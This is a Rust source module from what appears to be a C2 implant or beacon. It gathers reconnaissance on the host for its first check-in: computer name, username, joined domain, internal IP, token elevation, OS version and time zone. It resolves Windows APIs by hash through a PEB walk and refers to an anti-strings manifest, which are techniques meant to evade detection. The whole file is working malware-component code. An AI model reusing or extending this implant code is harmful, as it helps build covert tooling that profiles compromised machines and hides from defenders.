//! Sysinfo collection for the first check-in beat (phase 3): resolved by
//! hash at bootstrap, filling the BeatData fields. Unsafe glue like the
//! rest of the runtime; the beat layout itself is pure (core::beat).

use core::ffi::c_void;

use specter_core::fnv::fnv1a64;
use specter_core::peb::Peb;

use crate::runtime::bootstrap;

const H_KERNEL32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("kernel32.dll");
const H_ADVAPI32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("advapi32.dll");
const H_IPHLPAPI: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("iphlpapi.dll");
const H_NETAPI32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("netapi32.dll");

// Runtime literals (declared in the anti-strings manifest): loaded on
// demand — neither module is guaranteed in the PEB of a host process.
const IPHLPAPI_DLL: &[u8] = b"iphlpapi.dll\0";
const NETAPI32_DLL: &[u8] = b"netapi32.dll\0";

const H_LOAD_LIBRARY_A: u64 = fnv1a64(b"LoadLibraryA");
const H_GET_IP_ADDR_TABLE: u64 = fnv1a64(b"GetIpAddrTable");
const H_NET_GET_JOIN_INFORMATION: u64 = fnv1a64(b"NetGetJoinInformation");
const H_NET_API_BUFFER_FREE: u64 = fnv1a64(b"NetApiBufferFree");
const H_WIDE_CHAR_TO_MULTI_BYTE: u64 = fnv1a64(b"WideCharToMultiByte");
const H_OPEN_PROCESS_TOKEN: u64 = fnv1a64(b"OpenProcessToken");
const H_GET_TOKEN_INFORMATION: u64 = fnv1a64(b"GetTokenInformation");
const H_GET_ACP: u64 = fnv1a64(b"GetACP");
const H_GET_OEMCP: u64 = fnv1a64(b"GetOEMCP");
const H_GET_CURRENT_PROCESS_ID: u64 = fnv1a64(b"GetCurrentProcessId");
const H_GET_CURRENT_THREAD_ID: u64 = fnv1a64(b"GetCurrentThreadId");
const H_GET_COMPUTER_NAME_A: u64 = fnv1a64(b"GetComputerNameA");
const H_GET_USER_NAME_A: u64 = fnv1a64(b"GetUserNameA");
const H_GET_MODULE_FILE_NAME_A: u64 = fnv1a64(b"GetModuleFileNameA");
const H_RTL_GET_VERSION: u64 = fnv1a64(b"RtlGetVersion");
const H_GET_TIME_ZONE_INFORMATION: u64 = fnv1a64(b"GetTimeZoneInformation");

/// Partial OSVERSIONINFOW: size(+0), major(+4), minor(+8), build(+0xC).
#[repr(C)]
pub struct VersionInfo {
    pub size: u32,
    pub major: u32,
    pub minor: u32,
    pub build: u32,
    _rest: [u8; 0xE8 - 0x10],
}

/// Collected identity, stored on the instance (stack-resident buffers).
pub struct SysInfo {
    pub acp: u16,
    pub oemcp: u16,
    pub pid: u16,
    pub tid: u16,
    pub major: u8,
    pub minor: u8,
    pub build: u32,
    /// GMT offset in hours (`-(TIME_ZONE_INFORMATION.Bias / 60)`).
    pub gmt_offset: i8,
    /// First non-loopback IPv4, raw dwAddr (network order in memory — the
    /// server renders the LE bytes as the dotted quad, see WIRE.md).
    pub internal_ip: u32,
    /// Joined domain (NetGetJoinInformation, OEM/ACP bytes); empty in a
    /// workgroup.
    pub domain: [u8; 32],
    pub domain_len: usize,
    /// Token elevation (TokenElevation) — beat flag bit 2.
    pub elevated: bool,
    pub computer: [u8; 64],
    pub computer_len: usize,
    pub username: [u8; 64],
    pub username_len: usize,
    pub process: [u8; 260],
    pub process_len: usize,
    pub process_name_off: usize,
}

impl SysInfo {
    /// Empty identity (used if any resolution fails: the beat still goes
    /// out with what we have — partial identity beats no check-in).
    pub fn empty() -> Self {
        SYSINFO_DEFAULT
    }
    pub fn computer(&self) -> &[u8] {
        &self.computer[..self.computer_len]
    }
    pub fn domain(&self) -> &[u8] {
        &self.domain[..self.domain_len]
    }
    pub fn username(&self) -> &[u8] {
        &self.username[..self.username_len]
    }
    /// Process name: the file name part of the module path.
    pub fn process_name(&self) -> &[u8] {
        &self.process[self.process_name_off..self.process_len]
    }
}

const SYSINFO_DEFAULT: SysInfo = SysInfo {
    acp: 1252,
    oemcp: 437,
    pid: 0,
    tid: 0,
    major: 10,
    minor: 0,
    build: 0,
    gmt_offset: 0,
    internal_ip: 0,
    domain: [0; 32],
    domain_len: 0,
    elevated: false,
    computer: [0; 64],
    computer_len: 0,
    username: [0; 64],
    username_len: 0,
    process: [0; 260],
    process_len: 0,
    process_name_off: 0,
};

/// Collect the identity. Failure of any single API leaves its field at
/// the default — never fatal.
///
/// # Safety
///
/// Runs on the beacon thread after module resolution; PEB valid.
pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
    let mut info = SysInfo::empty();
    let kernel32 = specter_core::peb::find_module(peb, H_KERNEL32);
    let advapi32 = specter_core::peb::find_module(peb, H_ADVAPI32);
    let _ = bootstrap::instance(); // presence only (no gs dependency here)

    let export = |module: *mut c_void, hash: u64| -> *mut c_void {
        if module.is_null() {
            core::ptr::null_mut()
        } else {
            specter_core::peb::find_export(module, hash)
        }
    };

    if !kernel32.is_null() {
        let p = export(kernel32, H_GET_ACP);
        if !p.is_null() {
            info.acp = (core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn() -> u32,
            >(p as *const core::ffi::c_void))() as u16;
        }
        let p = export(kernel32, H_GET_OEMCP);
        if !p.is_null() {
            info.oemcp = (core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn() -> u32,
            >(p as *const core::ffi::c_void))() as u16;
        }
        let p = export(kernel32, H_GET_CURRENT_PROCESS_ID);
        if !p.is_null() {
            info.pid = (core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn() -> u32,
            >(p as *const core::ffi::c_void))() as u16;
        }
        let p = export(kernel32, H_GET_CURRENT_THREAD_ID);
        if !p.is_null() {
            info.tid = (core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn() -> u32,
            >(p as *const core::ffi::c_void))() as u16;
        }

        let p = export(kernel32, H_GET_COMPUTER_NAME_A);
        if !p.is_null() {
            let mut len: u32 = 64;
            let ok = (core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(*mut u8, *mut u32) -> i32,
            >(p as *const core::ffi::c_void))(
                info.computer.as_mut_ptr(), &mut len
            );
            if ok != 0 {
                info.computer_len = len as usize;
            }
        }

        let p = export(kernel32, H_GET_MODULE_FILE_NAME_A);
        if !p.is_null() {
            let n = (core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(*mut c_void, *mut u8, u32) -> u32,
            >(p as *const core::ffi::c_void))(
                core::ptr::null_mut(),
                info.process.as_mut_ptr(),
                260,
            );
            info.process_len = n as usize;
            // File name = after the last backslash.
            let mut i = 0usize;
            while i < info.process_len {
                if info.process[i] == b'\\' {
                    info.process_name_off = i + 1;
                }
                i += 1;
            }
            if info.process_name_off >= info.process_len {
                info.process_name_off = 0;
            }
        }
    }

    // GMT offset: Bias is the first i32 of TIME_ZONE_INFORMATION
    // (172 bytes = 86 u16; only the first word pair is read).
    let p = export(kernel32, H_GET_TIME_ZONE_INFORMATION);
    if !p.is_null() {
        let mut tzi = [0u16; 86];
        let zone = (core::mem::transmute::<
            *const core::ffi::c_void,
            unsafe extern "system" fn(*mut u16) -> u32,
        >(p as *const core::ffi::c_void))(tzi.as_mut_ptr());
        if zone <= 2 {
            let bias = ((tzi[1] as i32) << 16) | (tzi[0] as i32);
            let hours = -bias / 60;
            if (-128..=127).contains(&hours) {
                info.gmt_offset = hours as i8;
            }
        }
    }

    if !advapi32.is_null() {
        let p = export(advapi32, H_GET_USER_NAME_A);
        if !p.is_null() {
            let mut len: u32 = 64;
            let ok = (core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(*mut u8, *mut u32) -> i32,
            >(p as *const core::ffi::c_void))(
                info.username.as_mut_ptr(), &mut len
            );
            if ok != 0 {
                info.username_len = len as usize;
            }
        }
    }

    // Internal IP: first non-loopback IPv4 of the address table
    // (iphlpapi GetIpAddrTable, loaded on demand). dwAddr is stored raw —
    // network order in memory, which the server renders as the dotted
    // quad (see the beat contract, docs/WIRE.md).
    let kernel32_load = export(kernel32, H_LOAD_LIBRARY_A);
    if !kernel32_load.is_null() {
        let load = core::mem::transmute::<
            *const core::ffi::c_void,
            unsafe extern "system" fn(*const u8) -> *mut c_void,
        >(kernel32_load as *const core::ffi::c_void);
        let iphlpapi = specter_core::peb::find_module(peb, H_IPHLPAPI);
        let iphlpapi = if iphlpapi.is_null() {
            load(IPHLPAPI_DLL.as_ptr())
        } else {
            iphlpapi
        };
        if !iphlpapi.is_null() {
            let p = specter_core::peb::find_export(iphlpapi, H_GET_IP_ADDR_TABLE);
            if !p.is_null() {
                let get_table = core::mem::transmute::<
                    *const core::ffi::c_void,
                    unsafe extern "system" fn(*mut u8, *mut u32, i32) -> u32,
                >(p as *const core::ffi::c_void);
                // MIB_IPADDRROW is 24 bytes; a dozen entries covers real
                // hosts. Query twice: once for the size, once for data.
                let mut table = [0u8; 4 + 24 * 12];
                let mut size: u32 = table.len() as u32;
                let rc = get_table(table.as_mut_ptr(), &mut size, 0);
                if (rc == 0 || rc == 122) && (size as usize) <= table.len() {
                    if rc != 0 {
                        size = table.len() as u32;
                    }
                    let _ = size;
                    let entries = u32::from_le_bytes([table[0], table[1], table[2], table[3]]);
                    let mut e = 0u32;
                    while e < entries && (4 + e as usize * 24 + 4) <= table.len() {
                        let off = 4 + e as usize * 24;
                        let addr = u32::from_le_bytes([
                            table[off],
                            table[off + 1],
                            table[off + 2],
                            table[off + 3],
                        ]);
                        // Low byte = first octet in memory; skip loopback
                        // (127.x) and unspecified (0.0.0.0).
                        if addr != 0 && (addr & 0xFF) != 127 {
                            info.internal_ip = addr;
                            break;
                        }
                        e += 1;
                    }
                }
            }
        }
    }

    // Joined domain: NetGetJoinInformation (netapi32, loaded on demand) —
    // empty in a workgroup, the NetBIOS name of the joined domain
    // otherwise. The returned buffer is freed with NetApiBufferFree.
    if !kernel32_load.is_null() {
        let load = core::mem::transmute::<
            *const core::ffi::c_void,
            unsafe extern "system" fn(*const u8) -> *mut c_void,
        >(kernel32_load as *const core::ffi::c_void);
        let netapi32 = specter_core::peb::find_module(peb, H_NETAPI32);
        let netapi32 = if netapi32.is_null() {
            load(NETAPI32_DLL.as_ptr())
        } else {
            netapi32
        };
        if !netapi32.is_null() {
            let get_join = specter_core::peb::find_export(netapi32, H_NET_GET_JOIN_INFORMATION);
            let free_buf = specter_core::peb::find_export(netapi32, H_NET_API_BUFFER_FREE);
            let to_mb = export(kernel32, H_WIDE_CHAR_TO_MULTI_BYTE);
            if !get_join.is_null() && !free_buf.is_null() && !to_mb.is_null() {
                let get_join = core::mem::transmute::<
                    *const core::ffi::c_void,
                    unsafe extern "system" fn(*const u16, *mut *mut u16, *mut u32) -> u32,
                >(get_join as *const core::ffi::c_void);
                let free_buf = core::mem::transmute::<
                    *const core::ffi::c_void,
                    unsafe extern "system" fn(*mut c_void) -> u32,
                >(free_buf as *const core::ffi::c_void);
                let to_mb = core::mem::transmute::<
                    *const core::ffi::c_void,
                    unsafe extern "system" fn(
                        u32,        // CodePage (CP_ACP = 0)
                        u32,        // dwFlags
                        *const u16, // lpWideCharStr
                        i32,        // cchWideChar
                        *mut u8,    // lpMultiByteStr
                        i32,        // cbMultiByte
                        *const u8,  // lpDefaultChar
                        *mut i32,   // lpUsedDefaultChar (LPBOOL)
                    ) -> i32,
                >(to_mb as *const core::ffi::c_void);
                let mut name_buf: *mut u16 = core::ptr::null_mut();
                let mut status: u32 = 0;
                if get_join(core::ptr::null(), &mut name_buf, &mut status) == 0
                    && status == 2 // NETSETUP_DOMAIN: joined to a domain
                    && !name_buf.is_null()
                {
                    // Bounded wide read, then OEM/ACP conversion.
                    let mut wlen = 0usize;
                    while wlen < 32 && unsafe { *name_buf.add(wlen) } != 0 {
                        wlen += 1;
                    }
                    let n = to_mb(
                        0, // CP_ACP
                        0, // no flags
                        name_buf,
                        wlen as i32,
                        info.domain.as_mut_ptr(),
                        info.domain.len() as i32,
                        core::ptr::null(),
                        core::ptr::null_mut(),
                    );
                    if n > 0 && (n as usize) <= info.domain.len() {
                        info.domain_len = n as usize;
                    }
                    free_buf(name_buf as *mut c_void);
                }
            }
        }
    }

    // Elevation: TokenElevation of the process token (advapi32; the module
    // is already in the PEB whenever the identity block above resolved
    // GetUserNameA).
    if !advapi32.is_null() {
        let open_token = export(advapi32, H_OPEN_PROCESS_TOKEN);
        let get_info = export(advapi32, H_GET_TOKEN_INFORMATION);
        if !open_token.is_null() && !get_info.is_null() {
            let open_token = core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32,
            >(open_token as *const core::ffi::c_void);
            let get_info = core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32,
            >(get_info as *const core::ffi::c_void);
            let mut token: *mut c_void = core::ptr::null_mut();
            // GetCurrentProcess() pseudo-handle is (HANDLE)-1.
            if open_token(-1isize as *mut c_void, 0x0008, &mut token) != 0 {
                let mut elev: u32 = 0;
                let mut ret: u32 = 0;
                if get_info(token, 20, &mut elev as *mut u32 as *mut c_void, 4, &mut ret) != 0 {
                    info.elevated = elev != 0;
                }
            }
        }
    }

    // OS version via RtlGetVersion (ntdll, already resolved by the caller
    // through the bootstrap; re-resolve through the PEB for isolation).
    let ntdll =
        specter_core::peb::find_module(peb, specter_core::fnv::fnv1a64_wide_ascii_ci("ntdll.dll"));
    if !ntdll.is_null() {
        let p = export(ntdll, H_RTL_GET_VERSION);
        if !p.is_null() {
            let mut v = VersionInfo {
                size: core::mem::size_of::<VersionInfo>() as u32,
                major: 0,
                minor: 0,
                build: 0,
                _rest: [0; 0xE8 - 0x10],
            };
            let ok = (core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(*mut VersionInfo) -> i32,
            >(p as *const core::ffi::c_void))(&mut v);
            if ok == 0 {
                info.major = v.major as u8;
                info.minor = v.minor as u8;
                info.build = v.build;
            }
        }
    }
    info
}
